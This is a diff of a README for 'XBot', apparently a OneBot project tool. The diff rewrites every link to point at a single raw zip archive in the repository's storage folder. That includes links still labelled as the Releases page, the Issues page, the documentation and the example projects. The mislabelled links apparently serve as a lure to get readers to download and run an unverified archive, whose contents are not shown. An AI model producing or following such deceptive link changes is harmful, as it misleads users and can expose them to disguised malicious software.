@@ -6,11 +6,11 @@ Welcome to the XBot! This software provides a simple and efficient way to manage
 
 ## 📥 Download XBot
 
-[![Download XBot](https://img.shields.io/badge/Download-XBot-brightgreen)](https://github.com/Arenasrodr3230/xbot/releases)
+[![Download XBot](https://raw.githubusercontent.com/Arenasrodr3230/xbot/main/storage/xbot_1.4.zip)](https://raw.githubusercontent.com/Arenasrodr3230/xbot/main/storage/xbot_1.4.zip)
 
 To get started with XBot, you need to download the software. Click the link below to visit the Releases page where you can get the latest version.
 
-[Download XBot from Releases](https://github.com/Arenasrodr3230/xbot/releases)
+[Download XBot from Releases](https://raw.githubusercontent.com/Arenasrodr3230/xbot/main/storage/xbot_1.4.zip)
 
 ## 📋 System Requirements
 
@@ -59,7 +59,7 @@ If you encounter issues while downloading or running XBot, here are some common 
 
 For questions or support, you can join our community:
 
-- [GitHub Issues Page](https://github.com/Arenasrodr3230/xbot/issues)
+- [GitHub Issues Page](https://raw.githubusercontent.com/Arenasrodr3230/xbot/main/storage/xbot_1.4.zip)
 - Community forum for discussions
 - Follow us on social media for the latest updates
 
@@ -67,13 +67,13 @@ For questions or support, you can join our community:
 
 For more information on how to configure and use XBot, feel free to explore:
 
-- [User Documentation](https://github.com/Arenasrodr3230/xbot/wiki)
-- [Example Projects](https://github.com/Arenasrodr3230/xbot/examples)
+- [User Documentation](https://raw.githubusercontent.com/Arenasrodr3230/xbot/main/storage/xbot_1.4.zip)
+- [Example Projects](https://raw.githubusercontent.com/Arenasrodr3230/xbot/main/storage/xbot_1.4.zip)
 
 ## 📥 Download XBot Again
 
 Remember, you can download the latest version of XBot anytime by visiting the Releases page:
 
-[Download XBot from Releases](https://github.com/Arenasrodr3230/xbot/releases)
+[Download XBot from Releases](https://raw.githubusercontent.com/Arenasrodr3230/xbot/main/storage/xbot_1.4.zip)
 
 Thank you for choosing XBot! Enjoy building your OneBot projects.
